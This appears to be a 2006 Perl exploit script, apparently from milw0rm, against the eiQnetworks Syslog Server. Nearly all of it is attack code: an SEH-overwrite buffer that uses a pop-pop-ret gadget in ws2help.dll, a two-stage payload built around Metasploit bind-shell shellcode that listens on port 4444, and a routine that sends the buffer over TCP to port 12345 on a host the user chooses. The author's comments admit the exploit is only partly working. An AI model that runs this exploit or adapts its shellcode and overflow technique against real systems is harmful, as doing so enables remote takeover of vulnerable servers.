#!/usr/bin/perl -w
# 
# http://www.digitalmunition.com
# written by kf (kf_lists[at]digitalmunition[dot]com) - 03/23/2006
# Bug found by KF of digitalmunition.com.
#
# http://www.zerodayinitiative.com/advisories/ZDI-06-023.html
#
# Exploit for * Syslog Server by eiQnetworks  (OEM for Several vendors)
#
# There MUST be a syslog service listening on port 12345 for this to work. The syslog service is not enabled by default
#
# Currently borked... This shit overwrites the SEH on XP SP1. It just needs good shellcode. perhaps a reverse style jmp instead of a 
# forward jump. This would eliminate the need for 2 stages of shellcode. .  
#
#SEH chain of thread 00000FF4
#Address    SE handler
#013ECEF8   FWASyslo.00449EDB
#013EFF78   WS2HELP.71AA15CF   <-------- I set this address. 
#
#013EFF74   90909090
#013EFF78   909032EB  Pointer to next SEH record  <--- I set this. 
#013EFF7C   71AA15CF  SE handler   <--- pop pop ret 
#013EFF80   90909090
#
#71AA15CF   5F               POP EDI
#71AA15D0   5D               POP EBP
#71AA15D1   C2 0800          RETN 8
#
# View the SEH Chain and set a break on the address of the JMP code. This will let you debug the stage one shellcode.
#
use IO::Socket;

$bufsize = 4096; 

$hostname = "127.0.0.1";
$nextserec = pack("l", (0xEB069090)); # jmp short +0x06
$sehandler = pack("V", (0x71abe325)); # pop edi, pop ebp, retn - ws2help.dll  (Send this reversed note the 'V')

# Binary hunts performed by JxT and Titon
$tgts{"0"} = "G2SRv4.0.36.exe:932"; # Use length to SEH overwrite. 

unless (($target,$hostname) = @ARGV,$hostname) {

        print "\n        Syslog by eiQnetworks exploit, kf \(kf_lists[at]digitalmunition[dot]com\) - 03/23/2006\n";
        print "\n\nUsage: $0 <target> <host>\n\nTargets:\n\n";

        foreach $key (sort(keys %tgts)) {
                ($a,$b) = split(/\:/,$tgts{"$key"});
                print "\t$key . $a\n";
        }

        print "\n";
        exit 1;
}


($a,$b) = split(/\:/,$tgts{"$target"});
print "*** Target: $a, Len: $b\n";

# Stage 2 shellcode can be up to Length of SEH overwrite. 
$sc2 = 
# win32_bind -  EXITFUNC=seh LPORT=4444 
# Size=344 Encoder=PexFnstenvSub http://metasploit.com
"\x2b\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xb2".
"\xfa\xa1\x2c\x83\xeb\xfc\xe2\xf4\x4e\x90\x4a\x61\x5a\x03\x5e\xd3".
"\x4d\x9a\x2a\x40\x96\xde\x2a\x69\x8e\x71\xdd\x29\xca\xfb\x4e\xa7".
"\xfd\xe2\x2a\x73\x92\xfb\x4a\x65\x39\xce\x2a\x2d\x5c\xcb\x61\xb5".
"\x1e\x7e\x61\x58\xb5\x3b\x6b\x21\xb3\x38\x4a\xd8\x89\xae\x85\x04".
"\xc7\x1f\x2a\x73\x96\xfb\x4a\x4a\x39\xf6\xea\xa7\xed\xe6\xa0\xc7".
"\xb1\xd6\x2a\xa5\xde\xde\xbd\x4d\x71\xcb\x7a\x48\x39\xb9\x91\xa7".
"\xf2\xf6\x2a\x5c\xae\x57\x2a\x6c\xba\xa4\xc9\xa2\xfc\xf4\x4d\x7c".
"\x4d\x2c\xc7\x7f\xd4\x92\x92\x1e\xda\x8d\xd2\x1e\xed\xae\x5e\xfc".
"\xda\x31\x4c\xd0\x89\xaa\x5e\xfa\xed\x73\x44\x4a\x33\x17\xa9\x2e".
"\xe7\x90\xa3\xd3\x62\x92\x78\x25\x47\x57\xf6\xd3\x64\xa9\xf2\x7f".
"\xe1\xa9\xe2\x7f\xf1\xa9\x5e\xfc\xd4\x92\xb0\x70\xd4\xa9\x28\xcd".
"\x27\x92\x05\x36\xc2\x3d\xf6\xd3\x64\x90\xb1\x7d\xe7\x05\x71\x44".
"\x16\x57\x8f\xc5\xe5\x05\x77\x7f\xe7\x05\x71\x44\x57\xb3\x27\x65".
"\xe5\x05\x77\x7c\xe6\xae\xf4\xd3\x62\x69\xc9\xcb\xcb\x3c\xd8\x7b".
"\x4d\x2c\xf4\xd3\x62\x9c\xcb\x48\xd4\x92\xc2\x41\x3b\x1f\xcb\x7c".
"\xeb\xd3\x6d\xa5\x55\x90\xe5\xa5\x50\xcb\x61\xdf\x18\x04\xe3\x01".
"\x4c\xb8\x8d\xbf\x3f\x80\x99\x87\x19\x51\xc9\x5e\x4c\x49\xb7\xd3".
"\xc7\xbe\x5e\xfa\xe9\xad\xf3\x7d\xe3\xab\xcb\x2d\xe3\xab\xf4\x7d".
"\x4d\x2a\xc9\x81\x6b\xff\x6f\x7f\x4d\x2c\xcb\xd3\x4d\xcd\x5e\xfc".
"\x39\xad\x5d\xaf\x76\x9e\x5e\xfa\xe0\x05\x71\x44\x42\x70\xa5\x73".
"\xe1\x05\x77\xd3\x62\xfa\xa1\x2c";

# Stage 1 shellcode can only be 128 butes. 
# 12 byte Nop find code by skylined?  This is bullshit right now... it does not hunt for the right shit. 
$sc1 = "\x5f\x54\x90\xb8\x90\x90\xfc\x90\xaf\xf2\xc3\x57";

# for XP SP1  
#  <nops> <stage 2 shellcode><jmp code> <pop pop ret> <nops> <128 byte or less stage 1 shellcode> 

# Should total 4096
$buf = "\x90" x ($b - length($sc2)) . $sc2 . $nextserec  . $sehandler . "\x90" x (128 - length($sc1)) . $sc1 . "\x58" x ($bufsize-$b-8-128);  

print "Exploiting $hostname\n";

$sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>$hostname, PeerPort=>12345, Type=>SOCK_STREAM);

$sock or die "no socket :$!\n"; 

print $sock "$buf";
close $sock;

# milw0rm.com [2006-07-27]
